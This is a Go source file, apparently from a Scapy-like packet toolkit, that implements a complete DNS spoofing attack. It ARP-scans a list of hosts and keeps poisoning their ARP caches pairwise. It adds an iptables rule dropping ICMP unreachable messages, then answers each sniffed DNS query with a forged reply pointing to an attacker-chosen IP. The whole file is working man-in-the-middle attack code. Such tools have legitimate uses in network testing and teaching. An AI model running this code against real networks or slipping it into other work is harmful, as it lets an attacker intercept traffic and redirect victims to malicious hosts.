package higherlevel

import (
	"bufio"
	"fmt"
	"github.com/google/gopacket/layers"
	craft "github.com/tiagomdiogo/ScaGo/packet"
	"github.com/tiagomdiogo/ScaGo/supersocket"
	"github.com/tiagomdiogo/ScaGo/utils"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
)

func parseHosts(hosts string, mapList map[string]string, iface string) {
	file, err := os.Open(hosts)
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()

		// Check if the line is a valid IP address.
		if net.ParseIP(line) != nil {
			macAddress, err := ARPScanHost(iface, line)
			if err != nil {
				log.Fatal(err)
			}
			mapList[line] = macAddress
		}
	}
	return

}
func PoisonArp(mapList map[string]string, iface string, SuperS *supersocket.SuperSocket) {

	macInt := utils.MacByInt(iface)
	for {
		for addr1, mac1 := range mapList {
			for addr2, mac2 := range mapList {
				if addr1 != addr2 {
					fmt.Printf("Spoofing ARP cache: targetIP=%s, targetMac=%s, sourceIP=%s\n", addr1, mac1, addr2)
					packet1, packet2 := CreateFakeArp(addr1, addr2, mac1, mac2, macInt)
					SuperS.Send(packet1)
					SuperS.Send(packet2)
				}
			}
		}
		time.Sleep(1 * time.Second)
	}

}

func DNSSpoofing(iface, hosts, fakeIP string) {

	SuperS, err := supersocket.NewSuperSocket(iface, "")
	ipMap := make(map[string]string)
	cmd := exec.Command("iptables", "-A", "OUTPUT", "-p", "icmp", "--icmp-type", "destination-unreachable", "-j", "DROP")
	err = cmd.Run()
	if err != nil {
		log.Fatal(err)
	}
	parseHosts(hosts, ipMap, iface)
	fmt.Println("All the MAC obtained")

	fmt.Println("Poisoning the ARP cache of hosts")
	go PoisonArp(ipMap, iface, SuperS)

	for {
		packet, err := SuperS.Recv()
		if err != nil {
			log.Fatal(err)
		}

		dns := packet.Layer(layers.LayerTypeDNS)
		if dns == nil {
			continue
		}

		ethLayer, _ := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
		ipLayer, _ := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
		udpLayer, _ := packet.Layer(layers.LayerTypeUDP).(*layers.UDP)
		dnsLayer, _ := dns.(*layers.DNS)

		if dnsLayer.QR == false && dnsLayer.OpCode == layers.DNSOpCodeQuery {
			//eth layer
			ethToSend := craft.EthernetLayer()
			ethToSend.SetDstMAC(ethLayer.SrcMAC.String())
			ethToSend.SetSrcMAC(utils.MacByInt(iface))
			ethToSend.SetEthernetType(ethLayer.EthernetType)

			//iplayer
			ipToSend := craft.IPv4Layer()
			ipToSend.SetSrcIP(ipLayer.DstIP.String())
			ipToSend.SetDstIP(ipLayer.SrcIP.String())
			ipToSend.SetProtocol(layers.IPProtocolUDP)

			//udpLayer
			udpToSend := craft.UDPLayer()
			udpToSend.SetSrcPort("53")
			udpToSend.SetDstPort(udpLayer.SrcPort.String())
			udpToSend.Layer().SetNetworkLayerForChecksum(ipToSend.Layer())

			//dnsLayer
			dnsToSend := craft.DNSLayer()
			dnsToSend.Layer().ID = dnsLayer.ID
			dnsToSend.Layer().AA = false
			dnsToSend.Layer().ResponseCode = 0
			dnsToSend.AddAnswer(string(dnsLayer.Questions[0].Name), fakeIP)
			dnsToSend.Layer().Questions = dnsLayer.Questions

			packetCrafted, err := craft.CraftPacket(ethToSend.Layer(), ipToSend.Layer(), udpToSend.Layer(), dnsToSend.Layer())

			if err != nil {
				log.Fatal(err)
			}
			SuperS.Send(packetCrafted)

		}
	}

}
